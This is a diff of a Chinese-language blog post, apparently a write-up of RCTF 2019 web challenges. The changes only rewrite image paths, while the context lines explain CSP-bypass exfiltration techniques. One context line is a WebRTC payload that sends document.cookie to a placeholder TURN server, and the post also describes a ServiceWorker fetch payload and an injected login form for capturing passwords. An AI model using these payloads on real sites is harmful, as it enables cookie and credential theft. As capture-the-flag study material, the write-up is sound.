@@ -185,7 +185,7 @@
 </li>
 </ul>
 <p>可以得知无法修改属性的原因是 writable 特性被设置为了 false，而因为 configurable 也被设置为了 false，所以我们无法将其解冻。然后我们通过 getOwnPropertyDescriptors 查看 location 对象下的属性的特性：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052001.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/rctf2019/2019052001.png" srcset="/img/loading.gif" alt=""></p>
 <p>可以看到，在冻结了 document.location 之后，location.href 属性的 writable 已经变成了 false，就这是为什么我们无法通过修改它来进行跳转了。</p>
 <p>我们再注意解题使用的 host，可以发现这个属性没有 writable 特性，它的取值和赋值使用的是 getter 和 setter，这就是为什么它不会被 Object.freeze 冻结了。</p>
 <p>同样的，其他具有 writable 特性的属性也是会被冻结，无法修改的，比如里面的各个函数。</p>
@@ -196,7 +196,7 @@
 <h4 id="dns-prefetch"><a href="#dns-prefetch" class="headerlink" title="dns-prefetch"></a>dns-prefetch</h4><p><a href="https://wulidecade.cn/index.php/archives/32/" target="_blank" rel="noopener">https://wulidecade.cn/index.php/archives/32/</a></p>
 <p>简单来说就是利用 js 动态创建 link 标签，然后利用 DNS 预解析查询外带数据，不多说了。</p>
 <h4 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h4><p>CSP 中用来限制连接的配置是 connect-src，受限制的 API 是：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052002.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/rctf2019/2019052002.png" srcset="/img/loading.gif" alt=""></p>
 <p>而 WebRTC 不在其中，也不使用 fetch 所以不受影响，GitHub 上也有人提过 WebRTC 会绕过 CSP 的 connect-src 策略：<a href="https://github.com/w3c/webrtc-pc/issues/1727" target="_blank" rel="noopener">https://github.com/w3c/webrtc-pc/issues/1727</a> 。</p>
 <p>官方 payload 如下：</p>
 <pre><code class="javascript">var pc = new RTCPeerConnection({&quot;iceServers&quot;:[{&quot;urls&quot;:[&quot;turn:YOUR_IP:YOUR_PORT?transport=udp&quot;],&quot;username&quot;:document.cookie,&quot;credential&quot;:&quot;.&quot;}]});
@@ -221,8 +221,8 @@ pc.createOffer().then((sdp)=&gt;pc.setLocalDescription(sdp));
 <p>我们就可以使用 fetch 将我们需要的数据带出来。</p>
 <hr>
 <h3 id="赛题复现"><a href="#赛题复现" class="headerlink" title="赛题复现"></a>赛题复现</h3><h4 id="jali"><a href="#jali" class="headerlink" title="jali"></a>jali</h4><p>利用上传头像上传一个 js 文件，里面写上 fetch 的 payload，然后注册 ServiceWorker：</p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052301.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Aluvion/aluvion.github.io/master/css/images/rctf2019/2019052302.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/rctf2019/2019052301.png" srcset="/img/loading.gif" alt=""></p>
+<p><img src="/css/images/rctf2019/2019052302.png" srcset="/img/loading.gif" alt=""></p>
 <h4 id="password"><a href="#password" class="headerlink" title="password"></a>password</h4><p>还是利用同样的 js 文件，在 payload 中加上 登录 的表单：</p>
 <pre><code class="html">&lt;input type=&quot;username&quot; name=&quot;username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; 
 </code></pre>
